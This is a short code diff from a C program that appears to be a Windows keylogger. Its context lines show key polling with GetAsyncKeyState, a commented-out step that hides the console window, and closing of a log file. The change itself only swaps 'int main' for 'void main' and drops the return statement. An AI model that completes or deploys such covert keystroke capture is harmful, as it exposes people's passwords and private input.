@@ -12,7 +12,7 @@ int G(int a){
     GetAsyncKeyState(a);
 }
 
-int main()
+void main()
 {
     HWND hwnd=GetConsoleWindow();
     //ShowWindow(hwnd,SW_MINIMIZE); //wont hide the window, minimise
@@ -77,5 +77,5 @@ int main()
         }
     }
     fclose(fp);
-    return 0;
+ 
 }
